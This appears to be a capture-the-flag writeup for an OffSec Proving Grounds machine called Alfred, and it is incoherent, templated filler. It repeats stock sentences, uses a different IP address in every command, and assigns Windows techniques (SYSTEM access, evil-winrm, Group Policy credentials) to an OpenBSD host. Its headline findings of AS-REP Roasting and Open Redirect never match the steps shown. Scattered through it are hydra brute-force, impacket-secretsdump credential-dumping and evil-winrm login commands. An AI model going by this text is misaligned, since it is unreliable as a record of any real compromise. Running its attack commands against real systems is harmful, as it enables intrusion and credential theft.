---
TitleSEO: "OffSec Proving Grounds — Alfred (Medium OpenBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Alfred (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Alfred. AS-REP Roasting and Open Redirect to achieve medium compromise on OpenBSD."
Keywords: "web, hackthebox, medium, offsec, easy"
URL: "https://zurefx.github.io/writeups/htb-alfred-566.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-alfred-566/"
Date: "2024-05-22"
Tags: "Web, HackTheBox, Medium, OffSec, Easy"
Section: "writeups"
Lang: "en"
main_img: "htb-alfred-566"
Permalink: "/writeups/htb-alfred-566.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Alfred** is rated **Medium** on OffSec Proving Grounds. It runs **OpenBSD** and the IP address during this analysis was `10.93.214.191`.

### Objectives

The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.40.5.244/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.25.10.57 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.89.59.32/FUZZ
```

The kernel version was outdated and vulnerable to a publicly known exploit. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Service Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
evil-winrm -i 10.123.126.10 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p636,135,27017 10.95.248.182 -oN scan.txt
evil-winrm -i 10.22.5.234 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.37.238.239
```

Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

### Web Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p3389,23,110 10.67.45.9 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.85.86.112
```

The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Exploitation

### Vulnerability Identification

The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities. Group Policy Preferences contained encrypted but recoverable credentials.

Key finding: **AS-REP Roasting**.

The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

### Initial Access

The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.109.167.82 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.65.249.65 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality.

## Privilege Escalation

### Enumeration

Command injection was possible through unsanitized user input in the search functionality. Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine.

```powershell
gobuster dir -u http://10.62.210.208/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.19.78.91/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

### Exploitation

The target system was identified as running a vulnerable version of the service. Command injection was possible through unsanitized user input in the search functionality.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.19.48.49 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.20.199.152/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The database credentials were hardcoded in the application source code. Weak file permissions allowed modification of critical system files.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Privilege escalation was possible due to misconfigured sudo permissions. Command injection was possible through unsanitized user input in the search functionality.

## Summary

### Tools Used

- `enum4linux`
- `pwncat`
- `burpsuite`
- `rpcclient`
- `chisel`
- `impacket`

### Key Takeaways

- AS-REP Roasting
- Open Redirect
